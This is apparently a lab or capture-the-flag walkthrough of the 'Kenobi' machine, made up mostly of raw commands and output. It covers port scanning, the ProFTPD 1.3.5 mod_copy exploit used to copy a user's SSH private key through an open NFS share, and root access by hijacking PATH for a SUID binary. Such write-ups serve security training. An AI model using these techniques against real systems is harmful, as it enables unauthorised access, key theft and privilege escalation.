## MACHINE IP
```bash
10.10.231.221
```
## NMAP SCAN
```bash
# Nmap 7.95 scan initiated Thu Sep 25 08:23:55 2025 as: /usr/lib/nmap/nmap -Pn -p- -sV -sC -v -T5 --open --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 -oN nmap/scan-script-version 10.10.231.221
Nmap scan report for 10.10.231.221
Host is up (0.35s latency).
Not shown: 65484 closed tcp ports (reset), 40 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         ProFTPD 1.3.5
22/tcp    open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0b:c0:a5:cb:57:23:d9:ba:f2:8b:31:0d:e0:8d:8c:c7 (RSA)
|   256 93:33:04:2a:87:b5:bd:2e:47:dd:19:ac:64:fb:f0:dc (ECDSA)
|_  256 0a:fc:90:2b:1f:db:06:74:86:95:4f:03:49:c3:97:26 (ED25519)
80/tcp    open  http        Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      40276/udp   mountd
|   100005  1,2,3      41455/udp6  mountd
|   100005  1,2,3      43521/tcp6  mountd
|   100005  1,2,3      55207/tcp   mountd
|   100021  1,3,4      40385/tcp6  nlockmgr
|   100021  1,3,4      40617/tcp   nlockmgr
|   100021  1,3,4      42630/udp   nlockmgr
|   100021  1,3,4      55345/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
2049/tcp  open  nfs         3-4 (RPC #100003)
40617/tcp open  nlockmgr    1-4 (RPC #100021)
41153/tcp open  mountd      1-3 (RPC #100005)
55207/tcp open  mountd      1-3 (RPC #100005)
56543/tcp open  mountd      1-3 (RPC #100005)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   KENOBI<00>           Flags: <unique><active>
|   KENOBI<03>           Flags: <unique><active>
|   KENOBI<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
|_clock-skew: -2s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-09-25T02:54:57
|_  start_date: N/A

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 25 08:25:10 2025 -- 1 IP address (1 host up) scanned in 75.67 seconds

```
## OPEN PORTS - ANALYSIS
```bash
21/tcp    open  ftp         ProFTPD 1.3.5
22/tcp    open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http        Apache httpd 2.4.41 ((Ubuntu))
111/tcp   open  rpcbind     2-4 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
2049/tcp  open  nfs         3-4 (RPC #100003)
40617/tcp open  nlockmgr    1-4 (RPC #100021)
41153/tcp open  mountd      1-3 (RPC #100005)
55207/tcp open  mountd      1-3 (RPC #100005)
56543/tcp open  mountd      1-3 (RPC #100005)
```
## RECON
```bash
# Operating System       // Found post user shell
Linux kenobi 5.15.0-139-generic
# Credentials            // Found post user shell
- Found user Private Key 
```
## ENUMERATION
```bash
# Searching Exploits
searchsploit ProFTPD 1.3.5
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2) | linux/remote/49908.py
searchspoit -m linux/remote/49908.py

# Running the exploit
python3 49908.py $ip
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.231.221]
350 File or directory exists, ready for destination name
550 cpto: Permission denied
350 File or directory exists, ready for destination name
550 cpto: Permission denied
Exploit Completed
[!] Something Went Wrong
[!] Directory might not be writable

# Checking the exploit code 
client.send(b'site cpfr /proc/self/fd/3\r\n')
print(client.recv(1024).decode())
client.send(b'site cpto /var/www/html/test.php\r\n')
print(client.recv(1024).decode())
client.close()
print('Exploit Completed')

- Seems like we can copy contents from a file and paste to another file 
- I think we dont have write permission on /var/www/html 
  
# Checking Shares
sudo nxc smb $ip --shares -u 'anonymous' -p ''
SMB         10.10.231.221   445    KENOBI           Share           Permissions     Remark
SMB         10.10.231.221   445    KENOBI           -----           -----------     ------
SMB         10.10.231.221   445    KENOBI           print$                          Printer Drivers
SMB         10.10.231.221   445    KENOBI           anonymous       READ
SMB         10.10.231.221   445    KENOBI           IPC$                            IPC Service (kenobi server (Samba, Ubuntu))           

# Spider the shares
sudo nxc smb $ip -u 'anonymous' -p '' --spider anonymous --regex .
SMB         10.10.231.221   445    KENOBI           //10.10.231.221/anonymous/log.txt [lastm:'2019-09-04 16:19' size:12237]                                            

# Downloading the file 
sudo nxc smb $ip -u 'anonymous' -p '' --share anonymous --get-file log.txt ./dump/log.txt
SMB         10.10.231.221   445    KENOBI           [+] File "log.txt" was downloaded to "./dump/log.txt"

# log.txt file content analyis
- Found username: kenobi
- Private Key Path /home/kenobi/.ssh/id_rsa

# NFS Port Enumeration
sudo showmount -e $ip
Export list for 10.10.231.221:
/var *

# Mounting the NFS share
sudo mount -v -t nfs $ip:/var ./share
mount.nfs: timeout set for Thu Sep 25 09:14:35 2025
mount.nfs: trying text-based options 'vers=4.2,addr=10.10.231.221,clientaddr=10.13.80.25'

- seems like /var folder
- ls -la on /var found /var/tmp with write permission
	  - drwxrwxrwt  8 root root  4096 Sep 25 08:28 tmp 

# Try to copt the private key to /var/tmp
sudo nc -vv $ip 21
10.10.231.221: inverse host lookup failed: Unknown host
(UNKNOWN) [10.10.231.221] 21 (ftp) open
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.231.221]
site cpfr /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
site cpto /var/www/html/test.php
550 cpto: Permission denied
site cpto /var/www/test.php         
503 Bad sequence of commands
site cpto /var/www/html/test.php
503 Bad sequence of commands
site cpfr /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
site cpto /var/www/test.txt
550 cpto: Permission denied
site cpfr /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
site cpto /var/tmp/id_rsa
250 Copy successful
421 Login timeout (300 seconds): closing control connection
 sent 253, rcvd 447

- Able to copy and view the private key file from /var/tmp/id_rsa from /home/kenobi/.ssh/id_rsa 
```
## INITIAL SHELL
```bash
- Copy the Private Key contents 
nano id_rsa 

- Change permission
sudo chmod 600 id_rsa

# User Shell
sudo ssh -i id_rsa kenobi@$ip

kenobi@kenobi:~$ id
uid=1000(kenobi) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
```
## PRIVILEGE ESCALATION
```bash
# SUID + PATH Variable Manipulation
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/menu

kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
HTTP/1.1 200 OK
Date: Thu, 25 Sep 2025 03:45:33 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
ETag: "c8-591b6884b6ed2"
Accept-Ranges: bytes
Content-Length: 200
Vary: Accept-Encoding
Content-Type: text/html

- Checking the binary of /usr/bin/menu 
  
kenobi@kenobi:~$ strings /usr/bin/menu
curl -I localhost
uname -r
ifconfig

- We can find that the /usr/bin/menu runs curl uname and ifconfig binaries without an absolute path assigned

kenobi@kenobi:/tmp$ echo $PATH
/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

cd /home/kenobi
mkdir bin 
cd bin
echo "/bin/bash -p" > curl
chmod +x curl
```
## ROOT | ADMINISTRATOR - PWNED
```bash
kenobi@kenobi:~/bin$ /usr/bin/menu                                                             

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@kenobi:~/bin# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
root@kenobi:~/bin# whoami
root
```
